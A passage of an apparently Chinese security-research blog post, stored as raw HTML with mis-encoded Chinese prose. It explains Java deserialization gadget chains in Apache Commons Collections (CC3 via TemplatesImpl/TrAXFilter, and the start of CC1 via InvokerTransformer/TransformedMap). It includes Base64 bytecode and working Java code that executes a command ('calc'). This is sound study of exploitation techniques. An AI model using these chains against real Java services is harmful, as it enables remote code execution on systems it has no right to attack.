class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å°†å…¶ç¼–è¯‘ä¸º HelloTemplatesImpl.classï¼Œç„¶åè¿›è¡Œ Base64 ç¼–ç ï¼Œå¾—åˆ°å¦‚ä¸‹ç»“æœï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAJAAQACwANAA4AEAAMABEADQAVAA8ADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL<span class="regexp">/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/</span>AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGQANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj</span><br></pre></td></tr></table></figure><p>æµ‹è¯• TemplatesImplï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.security.utils.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(object, value);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.decode(<span class="string">&quot;yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAJAAQACwANAA4AEAAMABEADQAVAA8ADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGQANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj&quot;</span>);</span><br><span class="line">        <span class="comment">//åå°„è®¾ç½® Field</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬åªéœ€ä¼ å…¥æ¶æ„å­—èŠ‚ç ç»™ TemplatesImplï¼Œç„¶åè°ƒç”¨å…¶ newTransformer æ–¹æ³•ã€‚é‚£ä¹ˆæœ‰æ²¡æœ‰ç±»å¯ä»¥è°ƒç”¨ TemplatesImpl.newTransformer()ï¼Œè¿™é‡Œå…ˆä»‹ç»ä¸€ä¸ªæ„é€  CC3 ä¸­å°†ä¼šç”¨åˆ°çš„ç±» TrAXFilterï¼Œä¸‹é¢æ˜¯å…¶æ„é€ å‡½æ•°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrAXFilter</span> <span class="keyword">extends</span> <span class="title class_">XMLFilterImpl</span> &#123;</span><br><span class="line">    <span class="comment">//æ„é€ å‡½æ•°</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span> <span class="keyword">throws</span></span><br><span class="line">            TransformerConfigurationException</span><br><span class="line">    &#123;</span><br><span class="line">        _templates = templates;</span><br><span class="line">        _transformer = (TransformerImpl) templates.newTransformer(); <span class="comment">//å…³é”®ç‚¹</span></span><br><span class="line">â€¦â€¦â€¦â€¦</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æµ‹è¯• TrAXFilterï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.impl.dv.util.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Transformer;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æµ‹è¯• TrAXFilter</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="comment">//åå°„è®¾ç½® Field</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object</span></span><br><span class="line"><span class="params">            value)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(object, value);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.decode(<span class="string">&quot;yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAJAAQACwANAA4AEAAMABEADQAVAA8ADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGQANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj&quot;</span>);</span><br><span class="line">        <span class="comment">//åå°„è®¾ç½® Field</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">        instantiateTransformer.transform(TrAXFilter.class);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">###è¾“å‡º</span><br><span class="line">å¼¹å‡ºè®¡ç®—å™¨</span><br></pre></td></tr></table></figure><h2 id="CC1">CC1</h2><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240401225549195.png" alt="image-20240401225549195">image-20240401225549195</p><h3 id="ç¯å¢ƒæ­å»º">ç¯å¢ƒæ­å»º</h3><p>jdkä¸º8u65</p><h3 id="InvokerTransformer-transform">InvokerTransformer.transform</h3><p>CC1æ¼æ´ç‚¹åœ¨ InvokerTransformer</p><p>InvokerTransformer</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240401232841292.png" alt="image-20240401232841292"></p><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªç±»çš„ transform æ–¹æ³•ä¸­æœ‰ä»»æ„æ–¹æ³•è°ƒç”¨</p><p>åšä¸ª demo</p><p>å…ˆç”¨åå°„è°ƒç”¨å‡½æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RunTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>,String.class);</span><br><span class="line">        method.invoke(runtime,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240401232921196.png" alt="image-20240401232921196"></p><p>ç„¶åä½¿ç”¨è¿™ä¸ªç±»è¿›è¡Œä»»æ„æ–¹æ³•è°ƒç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RunTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(runtime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240401234053202.png" alt="image-20240401234053202"></p><p>ç„¶åçœ‹å“ªä¸ªç±»è°ƒç”¨ transform æ–¹æ³•</p><h3 id="TransformedMap-checkSetValue">TransformedMap.checkSetValue</h3><p>æ‰¾åˆ°äº† TransformedMap æ–¹æ³•</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240401234346452.png" alt="image-20240401234346452"></p><p>è¿™é‡Œä¼šè°ƒç”¨ transform æ–¹æ³•</p><p>çœ‹ä¸€ä¸‹æ„é€ å‡½æ•°</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240401234423771.png" alt="image-20240401234423771"></p><p>ç®€å•ç†è§£ä¸ºå¯¹ä¼ å…¥çš„ key ä¸ value è¿›è¡Œæ“ä½œï¼Œæ“ä½œå†…å®¹å°±åœ¨ä¼ å…¥çš„ Transformer é‡Œé¢ï¼Œå°±æ˜¯è¯´åªè¦æˆ‘ä»¬æŠŠ valueTransformer è®¾ç½®ä¸º InvokerTransformer ï¼Œé‚£ä¹ˆè°ƒç”¨ checkSetValue çš„æ—¶å€™å°±ä¼šè°ƒç”¨å…¶transform æ–¹æ³•</p><p>æ¥ç€æˆ‘ä»¬å¯»æ‰¾è°ƒç”¨äº† TransformedMap.checkSetValue çš„ç±»</p><h3 id="AbstractInputCheckedMapDecorator-MapEntry">AbstractInputCheckedMapDecorator.MapEntry</h3><p>æ‰¾åˆ°äº† AbstractInputCheckedMapDecorator ç±»ï¼Œæ³¨æ„ AbstractInputCheckedMapDecorator æ˜¯TransformedMap çš„çˆ¶ç±»</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240402000120986.png" alt="image-20240402000120986"></p><p>åœ¨ MapEntry ä¸­è°ƒç”¨äº† checkSetValue æ–¹æ³•ï¼Œè€Œ MapEntry æ˜¯åœ¨éå†Mapçš„æ—¶å€™ä¼šè°ƒç”¨</p><p>ç»§ç»­æµ‹è¯•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RunTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span 